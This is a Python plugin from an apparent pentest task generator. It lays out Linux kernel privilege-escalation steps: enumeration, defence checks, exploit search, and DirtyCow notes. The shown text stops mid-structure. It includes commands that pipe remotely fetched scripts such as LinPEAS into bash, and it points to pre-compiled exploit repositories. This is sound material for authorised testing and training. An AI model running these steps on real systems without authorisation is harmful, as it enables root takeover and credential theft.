"""
Linux Kernel Exploitation service plugin

Generates tasks for Linux kernel vulnerability detection and exploitation including:
- Kernel version detection and CVE research
- Automated exploit suggestion tools
- Manual kernel enumeration
- Defense enumeration (ASLR, SELinux, AppArmor, etc.)
- Specific CVE exploitation (DirtyCow, POSIX CPU Timers, etc.)
- Exploit compilation workflow
- Kernel exploit repositories

Extracted from HackTricks: linux-hardening/privilege-escalation/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxKernelExploitPlugin(ServicePlugin):
    """Linux kernel exploitation enumeration plugin"""

    @property
    def name(self) -> str:
        return "linux-kernel-exploit"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-based, manually triggered

    @property
    def service_names(self) -> List[str]:
        return ['linux-kernel', 'kernel-exploit', 'linux-privesc']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Manually triggered plugin - not auto-detected"""
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect kernel exploit activation from findings

        Activates on:
        - Kernel vulnerability detected (perfect match)
        - OS Linux detected (kernel exploits relevant)
        - CVE mentioned with kernel context

        Returns:
            int: Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Kernel vulnerability
        if finding_type == FindingTypes.KERNEL_VULNERABLE:
            logger.info("Kernel exploit activating: Kernel vulnerability detected")
            return 100

        # High - Kernel mentioned in description
        if 'kernel' in description:
            if any(term in description for term in ['vulnerable', 'cve', 'exploit', 'version']):
                logger.info(f"Kernel exploit activating: Kernel vulnerability in {description}")
                return 90

        # Medium - Linux OS detected (kernel exploits may be relevant)
        if finding_type == FindingTypes.OS_LINUX:
            return 60

        # Medium - Low privilege shell (kernel exploit might be needed for privesc)
        if finding_type == FindingTypes.LOW_PRIVILEGE_SHELL:
            if 'linux' in description:
                return 55

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux kernel exploitation task tree

        Args:
            target: Target hostname/IP
            port: Not used (manually triggered)
            service_info: Should contain 'kernel_version' if known

        Returns:
            Hierarchical task tree for kernel exploitation
        """
        kernel_version = service_info.get('kernel_version', 'unknown')

        tasks = {
            'id': 'linux-kernel-exploit',
            'name': 'Linux Kernel Exploitation',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: System Information Gathering
        tasks['children'].append(self._get_system_info_tasks(target))

        # PHASE 2: Defense Enumeration
        tasks['children'].append(self._get_defense_enum_tasks(target))

        # PHASE 3: Kernel Version Detection
        tasks['children'].append(self._get_kernel_detection_tasks(target))

        # PHASE 4: Automated Exploit Suggestion
        tasks['children'].append(self._get_exploit_suggester_tasks(target))

        # PHASE 5: Manual CVE Research
        tasks['children'].append(self._get_manual_cve_research_tasks(target, kernel_version))

        # PHASE 6: Known CVE Exploits
        tasks['children'].append(self._get_known_cve_exploits_tasks(target))

        # PHASE 7: Exploit Compilation
        tasks['children'].append(self._get_compilation_tasks(target))

        # PHASE 8: Exploit Repositories
        tasks['children'].append(self._get_exploit_repos_tasks())

        return tasks

    def _get_system_info_tasks(self, target: str) -> Dict[str, Any]:
        """System information enumeration tasks"""
        return {
            'id': 'kernel-sysinfo',
            'name': 'System Information Gathering',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-os-info',
                    'name': 'OS Version Detection',
                    'type': 'command',
                    'metadata': {
                        'command': '(cat /proc/version || uname -a) 2>/dev/null',
                        'description': 'Identify OS and kernel version for exploit research',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/proc/version': 'Kernel version and build information',
                            'uname -a': 'System information (fallback if /proc/version unavailable)',
                            '2>/dev/null': 'Suppress error messages'
                        },
                        'success_indicators': [
                            'Kernel version displayed (e.g., Linux 3.13.0-24-generic)',
                            'Distribution information shown',
                            'Build date and compiler version visible'
                        ],
                        'failure_indicators': [
                            'Permission denied on /proc/version',
                            'uname command not found'
                        ],
                        'next_steps': [
                            'Note exact kernel version for CVE research',
                            'Check kernel compile date (older = more vulns)',
                            'Run exploit suggester tools with this version',
                            'Search ExploitDB: searchsploit "Linux Kernel <version>"'
                        ],
                        'alternatives': [
                            'cat /etc/os-release',
                            'lsb_release -a',
                            'cat /etc/issue',
                            'hostnamectl (systemd systems)'
                        ],
                        'notes': 'Kernel version is critical - even minor version differences affect exploit compatibility',
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'kernel-detailed-os',
                    'name': 'Detailed OS Information',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /etc/os-release 2>/dev/null',
                        'description': 'Get distribution details (modern systems)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/etc/os-release': 'Universal distribution info file (systemd standard)'
                        },
                        'success_indicators': [
                            'PRETTY_NAME shows distribution and version',
                            'VERSION_ID provides specific version number'
                        ],
                        'failure_indicators': [
                            'File not found (older systems use /etc/issue)'
                        ],
                        'next_steps': [
                            'Cross-reference distro version with kernel version',
                            'Check for distro-specific kernel patches that may affect exploits'
                        ],
                        'alternatives': [
                            'cat /etc/issue',
                            'cat /etc/lsb-release',
                            'cat /etc/redhat-release (RHEL/CentOS)',
                            'cat /etc/debian_version'
                        ],
                        'notes': 'Some distributions backport security patches without changing kernel version'
                    }
                },
                {
                    'id': 'kernel-cpu-info',
                    'name': 'CPU Architecture Detection',
                    'type': 'command',
                    'metadata': {
                        'command': 'lscpu 2>/dev/null',
                        'description': 'Identify CPU architecture for exploit compilation',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'flag_explanations': {
                            'lscpu': 'Display CPU architecture information from sysfs/proc/cpuinfo'
                        },
                        'success_indicators': [
                            'Architecture shown (x86_64, i686, ARM, etc.)',
                            'CPU op-modes (32-bit, 64-bit)',
                            'Byte order (Little Endian, Big Endian)'
                        ],
                        'failure_indicators': [
                            'Command not found (use cat /proc/cpuinfo)'
                        ],
                        'next_steps': [
                            'Download exploits compiled for this architecture',
                            'If compiling, ensure gcc targets correct arch',
                            'Check if 32-bit exploits can run on 64-bit system'
                        ],
                        'alternatives': [
                            'uname -m',
                            'cat /proc/cpuinfo | grep -i "model name"',
                            'arch'
                        ],
                        'notes': 'Architecture mismatch is a common reason for exploit failure'
                    }
                },
                {
                    'id': 'kernel-env-info',
                    'name': 'Environment Variable Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': '(env || set) 2>/dev/null',
                        'description': 'Check for credentials, API keys, or interesting paths in environment',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'env': 'Display environment variables',
                            'set': 'Fallback - shows shell variables and functions',
                            '||': 'Try set if env fails'
                        },
                        'success_indicators': [
                            'PATH shows writable directories',
                            'Passwords or tokens in variables',
                            'LD_PRELOAD or LD_LIBRARY_PATH set (exploitation vector)'
                        ],
                        'failure_indicators': [
                            'Both commands fail (rare)'
                        ],
                        'next_steps': [
                            'Check PATH for hijackable directories',
                            'Look for AWS credentials, tokens, passwords',
                            'Note LD_* variables for shared library exploitation'
                        ],
                        'alternatives': [
                            'printenv',
                            'echo $PATH',
                            'export -p'
                        ],
                        'notes': 'LD_PRELOAD exploitation requires SUID binary without secure-execution mode'
                    }
                }
            ]
        }

    def _get_defense_enum_tasks(self, target: str) -> Dict[str, Any]:
        """Defense mechanism enumeration tasks"""
        return {
            'id': 'kernel-defense-enum',
            'name': 'Defense Mechanism Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-aslr-check',
                    'name': 'Check ASLR Status',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /proc/sys/kernel/randomize_va_space 2>/dev/null',
                        'description': 'Check Address Space Layout Randomization status',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/proc/sys/kernel/randomize_va_space': 'ASLR configuration: 0=disabled, 1=conservative, 2=full'
                        },
                        'success_indicators': [
                            '0 = ASLR disabled (best for exploitation)',
                            '1 = Conservative ASLR (stack, heap, libraries randomized)',
                            '2 = Full ASLR (all memory regions randomized)'
                        ],
                        'failure_indicators': [
                            'File not readable (rare)'
                        ],
                        'next_steps': [
                            'If 0: Many exploits will work reliably',
                            'If 1-2: Look for info leak vulns or ASLR bypasses',
                            'Some kernel exploits bypass ASLR via kernel memory leaks'
                        ],
                        'alternatives': [
                            'sysctl kernel.randomize_va_space',
                            'Check dmesg for "ASLR" mentions'
                        ],
                        'notes': 'ASLR=0 is rare on modern systems but common on embedded/old distros',
                        'estimated_time': '2 seconds'
                    }
                },
                {
                    'id': 'kernel-selinux-check',
                    'name': 'Check SELinux Status',
                    'type': 'command',
                    'metadata': {
                        'command': 'sestatus 2>/dev/null || echo "SELinux not found"',
                        'description': 'Check Security-Enhanced Linux status',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'sestatus': 'Display SELinux status and current mode',
                            '||': 'Fallback if SELinux not installed',
                            'echo': 'Inform that SELinux is not present'
                        },
                        'success_indicators': [
                            'SELinux status: disabled (exploitation easier)',
                            'SELinux status: enabled, Mode: permissive (logs but allows)',
                            'SELinux status: enabled, Mode: enforcing (blocks violations)'
                        ],
                        'failure_indicators': [
                            'Command not found (SELinux not installed - good for attacker)'
                        ],
                        'next_steps': [
                            'If disabled/not installed: Most exploits will work',
                            'If permissive: Exploits work, but logged (OpSec concern)',
                            'If enforcing: Look for policy bypasses or focus on allowed actions'
                        ],
                        'alternatives': [
                            'getenforce',
                            'cat /etc/selinux/config',
                            'grep -i selinux /var/log/audit/audit.log (check denials)'
                        ],
                        'notes': 'SELinux mainly affects post-exploitation, less impact on kernel exploits'
                    }
                },
                {
                    'id': 'kernel-apparmor-check',
                    'name': 'Check AppArmor Status',
                    'type': 'command',
                    'metadata': {
                        'command': 'if [ `which aa-status 2>/dev/null` ]; then aa-status; elif [ `which apparmor_status 2>/dev/null` ]; then apparmor_status; elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then ls -d /etc/apparmor*; else echo "AppArmor not found"; fi',
                        'description': 'Check AppArmor mandatory access control status',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'flag_explanations': {
                            'aa-status': 'Show loaded AppArmor profiles',
                            'apparmor_status': 'Alternative status command',
                            'ls -d /etc/apparmor*': 'Check for AppArmor config files',
                            'if/elif/else': 'Try multiple methods to detect AppArmor'
                        },
                        'success_indicators': [
                            'No profiles loaded (AppArmor disabled)',
                            'Profiles in complain mode (logs only)',
                            'List of enforce mode profiles (active restrictions)'
                        ],
                        'failure_indicators': [
                            'AppArmor not found (good for exploitation)'
                        ],
                        'next_steps': [
                            'If disabled: Proceed with exploits normally',
                            'If enabled: Check which profiles restrict your target binary',
                            'Look for unconfined processes to abuse'
                        ],
                        'alternatives': [
                            'cat /sys/kernel/security/apparmor/profiles',
                            'dmesg | grep -i apparmor',
                            'systemctl status apparmor'
                        ],
                        'notes': 'Common on Ubuntu/Debian systems, less on RHEL/CentOS'
                    }
                },
                {
                    'id': 'kernel-grsecurity-check',
                    'name': 'Check Grsecurity',
                    'type': 'command',
                    'metadata': {
                        'command': '(uname -r | grep "\\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Grsecurity detected" || echo "Grsecurity not found"',
                        'description': 'Detect Grsecurity kernel hardening patches',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'flag_explanations': {
                            'uname -r': 'Get kernel release string',
                            'grep "\\-grsec"': 'Check for grsecurity kernel naming',
                            '/etc/sysctl.conf': 'Check for grsecurity sysctl settings',
                            '&&/||': 'Logic - print if found or not found'
                        },
                        'success_indicators': [
                            'Grsecurity not found (easier exploitation)',
                            'Grsecurity detected (significant hardening - advanced exploitation needed)'
                        ],
                        'failure_indicators': [
                            'None - check always completes'
                        ],
                        'next_steps': [
                            'If not found: Standard kernel exploitation applies',
                            'If found: Research grsecurity bypasses (PaX, RBAC)',
                            'Focus on userspace vulns instead of kernel exploits'
                        ],
                        'alternatives': [
                            'dmesg | grep -i grsec',
                            'cat /proc/sys/kernel/grsecurity/* 2>/dev/null'
                        ],
                        'notes': 'Grsecurity is rare but extremely hardened - may block most kernel exploits'
                    }
                },
                {
                    'id': 'kernel-pax-check',
                    'name': 'Check PaX Protection',
                    'type': 'command',
                    'metadata': {
                        'command': '(which paxctl-ng paxctl >/dev/null 2>&1 && echo "PaX tools detected") || echo "PaX not found"',
                        'description': 'Check for PaX memory protection system',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'flag_explanations': {
                            'paxctl-ng': 'New PaX control utility',
                            'paxctl': 'Legacy PaX control utility',
                            'which': 'Check if commands exist in PATH'
                        },
                        'success_indicators': [
                            'PaX not found (standard exploitation)',
                            'PaX tools detected (memory protections active)'
                        ],
                        'failure_indicators': [
                            'None'
                        ],
                        'next_steps': [
                            'If not found: Proceed normally',
                            'If found: Check PaX flags on target binaries',
                            'Research PaX ASLR and PAGEEXEC bypasses'
                        ],
                        'alternatives': [
                            'dmesg | grep -i pax',
                            'cat /proc/self/status | grep PaX'
                        ],
                        'notes': 'PaX usually part of grsecurity patchset'
                    }
                },
                {
                    'id': 'kernel-execshield-check',
                    'name': 'Check Execshield',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep "exec-shield" /etc/sysctl.conf 2>/dev/null || echo "Execshield not configured"',
                        'description': 'Check for Execshield exploit mitigation (RHEL/CentOS)',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'flag_explanations': {
                            'exec-shield': 'Red Hat buffer overflow protection',
                            '/etc/sysctl.conf': 'Kernel parameters configuration file'
                        },
                        'success_indicators': [
                            'Execshield not configured (no NX protection)',
                            'kernel.exec-shield = 0 (disabled)',
                            'kernel.exec-shield = 1 (enabled)'
                        ],
                        'failure_indicators': [
                            'None'
                        ],
                        'next_steps': [
                            'If disabled: Stack-based exploits easier',
                            'If enabled: Need ROP or ret2libc techniques'
                        ],
                        'alternatives': [
                            'sysctl kernel.exec-shield',
                            'cat /proc/sys/kernel/exec-shield 2>/dev/null'
                        ],
                        'notes': 'Mainly RHEL/CentOS feature, replaced by NX bit on modern systems'
                    }
                },
                {
                    'id': 'kernel-dmesg-sig-check',
                    'name': 'Check dmesg Signature Verification',
                    'type': 'command',
                    'metadata': {
                        'command': 'dmesg 2>/dev/null | grep "signature"',
                        'description': 'Check for kernel module signature verification failures (potential exploit vector)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'flag_explanations': {
                            'dmesg': 'Kernel ring buffer messages',
                            'grep "signature"': 'Find signature verification issues'
                        },
                        'success_indicators': [
                            'Module signature verification failed (unsigned modules loaded)',
                            'No signature errors (strict verification)'
                        ],
                        'failure_indicators': [
                            'dmesg permission denied (kernel.dmesg_restrict=1)'
                        ],
                        'next_steps': [
                            'If signature failures: May be able to load malicious kernel modules',
                            'Check /proc/sys/kernel/modules_disabled',
                            'Research module loading exploits (e.g., dirty_sock for snap)'
                        ],
                        'alternatives': [
                            'journalctl -k | grep signature',
                            'cat /proc/sys/kernel/modules_disabled'
                        ],
                        'notes': 'Reference HTB Smasher2 box for exploitation example'
                    }
                }
            ]
        }

    def _get_kernel_detection_tasks(self, target: str) -> Dict[str, Any]:
        """Kernel version detection tasks"""
        return {
            'id': 'kernel-version-detect',
            'name': 'Kernel Version Detection',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-version-proc',
                    'name': 'Kernel Version from /proc',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /proc/version',
                        'description': 'Get detailed kernel version and build information',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/proc/version': 'Kernel version, GCC version, build date'
                        },
                        'success_indicators': [
                            'Full kernel version string (e.g., 4.4.0-116-generic)',
                            'Compiler version shown',
                            'Build timestamp displayed'
                        ],
                        'failure_indicators': [
                            'Permission denied (rare)'
                        ],
                        'next_steps': [
                            'Copy exact version for exploit research',
                            'Note build date - older kernels = more known vulnerabilities',
                            'Run automated exploit suggesters with this version'
                        ],
                        'alternatives': [
                            'uname -a',
                            'uname -r',
                            'cat /proc/sys/kernel/osrelease'
                        ],
                        'notes': 'Most reliable method for kernel version detection',
                        'estimated_time': '2 seconds'
                    }
                },
                {
                    'id': 'kernel-uname-all',
                    'name': 'Full System Information (uname)',
                    'type': 'command',
                    'metadata': {
                        'command': 'uname -a',
                        'description': 'Get all system information in one command',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'uname': 'Print system information',
                            '-a': 'All information (kernel name, hostname, version, arch, OS)'
                        },
                        'success_indicators': [
                            'Kernel name and release version',
                            'Machine architecture (x86_64, i686)',
                            'Hostname and OS name'
                        ],
                        'failure_indicators': [
                            'Command not found (extremely rare)'
                        ],
                        'next_steps': [
                            'Use kernel version for CVE lookup',
                            'Note architecture for exploit compilation',
                            'Cross-reference with /proc/version'
                        ],
                        'alternatives': [
                            'uname -r (release only)',
                            'uname -m (architecture only)',
                            'uname -s (kernel name only)'
                        ],
                        'notes': 'Standard POSIX command - works on all Unix-like systems'
                    }
                },
                {
                    'id': 'kernel-searchsploit-quick',
                    'name': 'Quick Kernel Exploit Search',
                    'type': 'command',
                    'metadata': {
                        'command': 'searchsploit "Linux Kernel"',
                        'description': 'Search ExploitDB for Linux kernel exploits',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'flag_explanations': {
                            'searchsploit': 'Search ExploitDB database',
                            '"Linux Kernel"': 'Search term for kernel exploits'
                        },
                        'success_indicators': [
                            'List of kernel exploits displayed',
                            'CVE numbers and affected versions shown',
                            'Exploit paths provided'
                        ],
                        'failure_indicators': [
                            'searchsploit not installed',
                            'Database not updated'
                        ],
                        'next_steps': [
                            'Filter by detected kernel version',
                            'searchsploit -x <EDB-ID> to view exploit details',
                            'searchsploit -m <EDB-ID> to copy exploit',
                            'Read exploit code for compilation requirements'
                        ],
                        'alternatives': [
                            'searchsploit "Linux Kernel <version>"',
                            'Online: https://www.exploit-db.com/',
                            'Google: "linux kernel <version> exploit"'
                        ],
                        'notes': 'Update database first: searchsploit -u',
                        'estimated_time': '10-30 seconds'
                    }
                }
            ]
        }

    def _get_exploit_suggester_tasks(self, target: str) -> Dict[str, Any]:
        """Automated exploit suggestion tools"""
        return {
            'id': 'kernel-exploit-suggesters',
            'name': 'Automated Exploit Suggestion Tools',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-les-sh',
                    'name': 'Linux Exploit Suggester (Shell)',
                    'type': 'command',
                    'metadata': {
                        'command': 'wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x les.sh && ./les.sh',
                        'description': 'Automated kernel exploit suggester (bash script)',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'RESEARCH'],
                        'flag_explanations': {
                            'wget': 'Download file from URL',
                            '-O les.sh': 'Save as les.sh',
                            'chmod +x': 'Make executable',
                            '&&': 'Chain commands - execute if previous succeeds',
                            './les.sh': 'Run the script'
                        },
                        'success_indicators': [
                            'Colored output showing exploits',
                            'CVE numbers with confidence levels',
                            'Download links for exploits',
                            'Exploit IDs from ExploitDB'
                        ],
                        'failure_indicators': [
                            'wget not installed (use curl)',
                            'No internet access (upload script manually)',
                            'Script errors on old kernel versions'
                        ],
                        'next_steps': [
                            'Focus on "Highly probable" exploits first',
                            'Download suggested exploits',
                            'Compile on similar system or target',
                            'Test exploits in order of probability'
                        ],
                        'alternatives': [
                            'curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash',
                            'Upload script via file upload vuln or writable share',
                            'Run from attacker machine if kernel version known'
                        ],
                        'notes': 'Best exploit suggester for OSCP - actively maintained, highly accurate',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': 'kernel-les2-pl',
                    'name': 'Linux Exploit Suggester 2 (Perl)',
                    'type': 'command',
                    'metadata': {
                        'command': 'wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O les2.pl && perl les2.pl',
                        'description': 'Alternative exploit suggester (Perl-based)',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'RESEARCH'],
                        'flag_explanations': {
                            'wget': 'Download Perl script',
                            '-O les2.pl': 'Save as les2.pl',
                            'perl': 'Execute Perl script (no chmod needed)'
                        },
                        'success_indicators': [
                            'List of potential kernel exploits',
                            'URLs to exploit source code',
                            'Version-specific recommendations'
                        ],
                        'failure_indicators': [
                            'Perl not installed',
                            'wget not available',
                            'Script compatibility issues'
                        ],
                        'next_steps': [
                            'Cross-reference with linux-exploit-suggester.sh results',
                            'Download exploits from provided URLs',
                            'Test exploits on target system'
                        ],
                        'alternatives': [
                            'curl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl | perl',
                            'Upload via SCP/file upload',
                            'linux-exploit-suggester.sh (more reliable)'
                        ],
                        'notes': 'Less accurate than les.sh but provides different perspective'
                    }
                },
                {
                    'id': 'kernel-linuxprivchecker',
                    'name': 'LinuxPrivChecker (Kernel 2.x)',
                    'type': 'command',
                    'metadata': {
                        'command': 'wget http://www.securitysift.com/download/linuxprivchecker.py -O lpc.py && python lpc.py',
                        'description': 'Legacy privesc checker for kernel 2.x systems',
                        'tags': ['OSCP:LOW', 'AUTOMATED'],
                        'flag_explanations': {
                            'wget': 'Download Python script',
                            'python': 'Execute with Python 2.x'
                        },
                        'success_indicators': [
                            'Comprehensive system enumeration',
                            'Kernel exploit suggestions for 2.x kernels',
                            'SUID binaries, cron jobs, etc.'
                        ],
                        'failure_indicators': [
                            'Python 2.x not installed',
                            'Only useful on very old kernels (2.x)'
                        ],
                        'next_steps': [
                            'Only use on ancient systems (2.6.x kernels)',
                            'Prefer modern tools for kernel 3.x+'
                        ],
                        'alternatives': [
                            'linux-exploit-suggester.sh (modern replacement)',
                            'LinPEAS (comprehensive enumeration)'
                        ],
                        'notes': 'LEGACY TOOL - only for kernel 2.x systems (rare in OSCP)'
                    }
                },
                {
                    'id': 'kernel-linpeas',
                    'name': 'LinPEAS (Comprehensive Enumeration)',
                    'type': 'command',
                    'metadata': {
                        'command': 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh',
                        'description': 'Comprehensive privilege escalation enumeration including kernel exploits',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'NOISY'],
                        'flag_explanations': {
                            'wget': 'Download latest LinPEAS release',
                            'chmod +x': 'Make executable',
                            './linpeas.sh': 'Execute enumeration'
                        },
                        'success_indicators': [
                            'Colored output with priority levels',
                            'Kernel exploit suggestions (red/yellow)',
                            'SUID binaries, sudo misconfigs, etc.',
                            'Credentials in files/memory'
                        ],
                        'failure_indicators': [
                            'Download fails (no internet)',
                            'Detected and blocked by AV/EDR (common)',
                            'Generates extensive logs (OPSEC risk)'
                        ],
                        'next_steps': [
                            'Focus on RED (95% PE vectors) items first',
                            'Check kernel exploit suggestions',
                            'Investigate YELLOW (privilege hints) items',
                            'Save output for offline analysis'
                        ],
                        'alternatives': [
                            'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash',
                            'Upload via HTTP POST if wget blocked',
                            'linux-smart-enumeration (LSE) - lighter alternative'
                        ],
                        'notes': 'Most comprehensive tool but VERY noisy - may alert defenders. Use with -a for brute-force checks',
                        'estimated_time': '2-5 minutes'
                    }
                }
            ]
        }

    def _get_manual_cve_research_tasks(self, target: str, kernel_version: str) -> Dict[str, Any]:
        """Manual CVE research workflow"""
        version_note = f' (Detected: {kernel_version})' if kernel_version != 'unknown' else ''

        return {
            'id': 'kernel-manual-cve-research',
            'name': f'Manual CVE Research{version_note}',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-searchsploit-version',
                    'name': 'SearchSploit by Kernel Version',
                    'type': 'manual',
                    'metadata': {
                        'description': f'Search ExploitDB for specific kernel version{version_note}',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'MANUAL'],
                        'alternatives': [
                            f'searchsploit "Linux Kernel {kernel_version}"' if kernel_version != 'unknown' else 'searchsploit "Linux Kernel <version>"',
                            'searchsploit -w "Linux Kernel" (web URLs)',
                            'searchsploit -j "Linux Kernel" (JSON output)',
                            'searchsploit -x <EDB-ID> (examine exploit)',
                            'searchsploit -m <EDB-ID> (mirror/copy exploit)'
                        ],
                        'next_steps': [
                            'Always read exploit source code before running',
                            'Check compilation requirements (gcc, libraries)',
                            'Verify kernel version matches exactly',
                            'Test on similar VM before target'
                        ],
                        'notes': 'Update database first: searchsploit -u. Always verify exploit authenticity and read code for understanding.'
                    }
                },
                {
                    'id': 'kernel-google-search',
                    'name': 'Google Kernel Version + Exploit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Manual Google research for kernel exploits',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'MANUAL'],
                        'alternatives': [
                            f'Google: "linux kernel {kernel_version} exploit"' if kernel_version != 'unknown' else 'Google: "linux kernel <version> exploit"',
                            'Google: "linux kernel <version> privilege escalation"',
                            'Google: "linux kernel <version> CVE"',
                            'Check: https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/Linux-Linux-Kernel.html'
                        ],
                        'next_steps': [
                            'Look for GitHub repositories with PoC exploits',
                            'Check security researchers\' blogs',
                            'Read vulnerability disclosures for exploit details',
                            'Verify exploit works for your exact kernel version'
                        ],
                        'notes': 'Many exploits on GitHub not in ExploitDB. Always verify source credibility.'
                    }
                },
                {
                    'id': 'kernel-exploit-repos',
                    'name': 'Search Kernel Exploit Repositories',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check curated kernel exploit collections',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'alternatives': [
                            'https://github.com/lucyoa/kernel-exploits (compiled exploits)',
                            'https://github.com/bwbwbwbw/linux-exploit-binaries (pre-compiled)',
                            'https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack',
                            'https://gitlab.com/exploit-database/exploitdb-bin-sploits (ExploitDB binaries)',
                            'Extract version list: curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: "'
                        ],
                        'next_steps': [
                            'Download pre-compiled binary for your arch',
                            'Verify SHA256 hash if provided',
                            'Upload to target via HTTP/SCP/file upload',
                            'Test execution and privilege escalation'
                        ],
                        'notes': 'Pre-compiled exploits save time but verify architecture match (x86_64 vs i686 vs ARM)'
                    }
                },
                {
                    'id': 'kernel-cvedetails-lookup',
                    'name': 'CVE Details Database Search',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search CVE database for kernel vulnerabilities',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'alternatives': [
                            'https://www.cvedetails.com/ - Search "Linux Kernel <version>"',
                            'https://nvd.nist.gov/ - National Vulnerability Database',
                            'https://cve.mitre.org/ - Official CVE list',
                            'Search for specific CVE: searchsploit CVE-YYYY-XXXXX'
                        ],
                        'next_steps': [
                            'Read CVE description for exploitability',
                            'Check CVSS score (7.0+ likely privilege escalation)',
                            'Search CVE number on ExploitDB/GitHub',
                            'Look for public PoC code'
                        ],
                        'notes': 'Not all CVEs have public exploits. Focus on high CVSS scores with local/privilege_escalation tags.'
                    }
                }
            ]
        }

    def _get_known_cve_exploits_tasks(self, target: str) -> Dict[str, Any]:
        """Known CVE-specific exploitation tasks"""
        return {
            'id': 'kernel-known-cves',
            'name': 'Known CVE Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-dirtycow',
                    'name': 'DirtyCow (CVE-2016-5195)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'kernel-dirtycow-info',
                            'name': 'DirtyCow Information',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Race condition in memory subsystem (Linux Kernel <= 3.19.0-73.8)',
                                'tags': ['OSCP:HIGH', 'RESEARCH'],
                                'notes': '''
DirtyCow (CVE-2016-5195) Overview:
- Affects: Linux Kernel 2.6.22 - 4.8.3
- Type: Race condition in Copy-on-Write (COW) mechanism
- Impact: Write to read-only memory mappings
- Exploit: Modify /etc/passwd or SUID binaries

Vulnerable Kernel Versions:
- Ubuntu 12.04-16.04 (kernel 3.x-4.4.x)
- Debian 7-8
- CentOS 6-7
- Kernel <= 4.8.3

Stabilization:
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

Reliable Exploits:
1. dirtycow-mem.c - Direct /etc/passwd modification
2. dirty.c (40847.c) - SUID binary modification
3. cowroot.c - Root shell via /usr/bin/passwd

OSCP Note: Very reliable, commonly found on older OSCP boxes
''',
                                'alternatives': [
                                    'https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs',
                                    'https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c',
                                    'searchsploit "dirty cow"',
                                    'ExploitDB: 40611, 40616, 40839, 40847'
                                ],
                                'next_steps': [
                                    'Check kernel version: uname -r',
                                    'Download PoC from GitHub',
                                    'Compile on target or similar system',
                                    'Stabilize with dirty_writeback_centisecs=0',
                                    'Run exploit and verify root access'
                                ]
                            }
                        },
                        {
                            'id': 'kernel-dirtycow-compile',
                            'name': 'Compile DirtyCow Exploit',
                            'type': 'command',
                            'metadata': {
